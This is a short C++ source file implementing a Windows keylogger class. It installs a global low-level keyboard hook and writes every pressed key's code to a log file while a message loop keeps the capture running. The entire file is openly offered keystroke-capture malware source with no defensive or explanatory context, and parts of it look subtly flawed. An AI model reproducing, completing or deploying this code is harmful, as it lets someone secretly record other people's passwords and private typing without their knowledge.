#include "keylogger.h"

Keylogger::Keylogger(const std::string &filename) {
    log_file = fopen(filename.c_str(), "w");
    if (log_file == NULL) {
        MessageBox(NULL, "Unable to open log file.", "Error", MB_OK | MB_ICONERROR);
        exit(1);
    }
}

Keylogger::~Keylogger() {
    fclose(log_file);
}

LRESULT CALLBACK Keylogger::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            fprintf(log_file, "%c", pKeyboard->vkCode);
            fflush(log_file);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void Keylogger::start() {
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (hook == NULL) {
        MessageBox(NULL, "Unable to install hook.", "Error", MB_OK | MB_ICONERROR);
        exit(1);
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
}
